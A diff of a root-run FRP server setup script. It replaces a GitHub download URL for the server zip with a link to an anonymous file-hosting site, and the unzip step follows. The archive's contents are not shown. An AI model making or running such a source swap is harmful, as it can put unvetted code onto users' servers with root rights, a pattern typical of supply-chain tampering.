@@ -9,7 +9,7 @@ sudo apt update && sudo apt install unzip -y
 
 # Step 2: Download the zip
 echo "Downloading FRP server files..."
-curl -o /root/ServerIP.zip https://github.com/ShivakshChaudhary/frp-setup/raw/refs/heads/main/ServerSide/ServerIP.zip
+curl -o /root/ServerIP.zip https://files.catbox.moe/xdtwva.zip
 
 # Step 3: Unzip the file
 echo "Unzipping to /root/ServerIP..."
